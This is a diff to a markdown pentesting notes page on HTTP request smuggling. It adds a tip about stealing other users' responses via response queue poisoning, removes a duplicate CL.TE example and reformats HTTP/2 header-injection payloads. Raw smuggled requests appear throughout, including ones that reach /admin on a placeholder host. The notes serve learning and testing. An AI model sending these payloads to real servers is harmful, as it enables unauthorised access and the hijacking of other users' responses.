@@ -269,6 +269,10 @@ csrf=ihmEx8D&postId=1&name=test&email=test@test.test&comment=
 **Note**: One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the `&` character, meaning that the content that is stored from the victim user's request will end at the first `&`, which might even appear in the query string
 {% endhint %}
 
+{% hint style="success" %}
+**Tip**: Another way to steal other users' responses is with the [#response-queue-poisoning](http-request-smuggling.md#response-queue-poisoning "mention") technique.
+{% endhint %}
+
 ### <mark style="color:yellow;">Exploit reflected XSS</mark>
 
 <mark style="color:yellow;">**CL.TE**</mark>
@@ -425,9 +429,13 @@ When you smuggle a complete request, the front-end server processes a single req
 
 </details>
 
+This attack can occur through HTTP/1 request smuggling or HTTP/2 downgrading.
+
 You need to smuggle a complete request.
 
-**Front-end (CL)**
+With this technique you can steal other users' responses.
+
+**(CL)**
 
 ```http
 POST / HTTP/1.1\r\n
@@ -439,28 +447,6 @@ Transfer-Encoding: chunked\r\n
 0\r\n
 \r\n
 GET /anything HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-\r\n
-GET / HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-\r\n
-```
-
-**Back-end (TE)**
-
-```http
-POST / HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-Content-Type: x-www-form-urlencoded\r\n
-Content-Length: 61\r\n
-Transfer-Encoding: chunked\r\n
-\r\n
-0\r\n
-\r\n
-GET /anything HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-\r\n
-GET / HTTP/1.1\r\n
 Host: vulnerable-website.com\r\n
 \r\n
 ```
@@ -472,8 +458,8 @@ This approach is more versatile, allowing even GET requests without relying on m
 ```http
 :method	        GET
 :path	        /
-:authority	vulnerable-website.com
-foo	        bar\r\n
+:authority      vulnerable-website.com
+foo             bar\r\n
                 \r\n
                 GET /admin HTTP/1.1\r\n
                 Host: vulnerable-website.com
@@ -484,8 +470,8 @@ During rewriting, some front-end servers append the new `Host` header after exis
 ```
 :method	        GET
 :path	        /
-:authority	vulnerable-website.com
-foo	        bar\r\n
+:authority      vulnerable-website.com
+foo             bar\r\n
                 Host: vulnerable-website.com\r\n
                 \r\n
                 GET /admin HTTP/1.1
